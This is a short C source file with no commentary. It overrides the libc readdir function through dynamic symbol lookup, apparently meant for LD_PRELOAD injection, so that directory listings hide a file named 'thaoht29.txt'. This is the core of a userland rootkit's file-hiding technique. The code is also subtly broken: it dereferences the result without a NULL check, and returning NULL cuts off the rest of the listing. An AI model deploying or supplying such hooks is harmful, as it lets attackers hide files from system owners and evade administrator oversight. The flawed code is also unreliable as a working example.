#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>

typedef struct dirent* TTT;
static TTT ent;

struct dirent* readdir(DIR *dirp)
{
    struct dirent* (*new_readdir)(DIR *dirp2);
    new_readdir = dlsym(RTLD_NEXT, "readdir");
    ent = (struct dirent*)new_readdir(dirp);
    if(strncmp(ent->d_name, "thaoht29.txt", 11) == 0)
    {
        return 0;
    }   
    return ent;
}
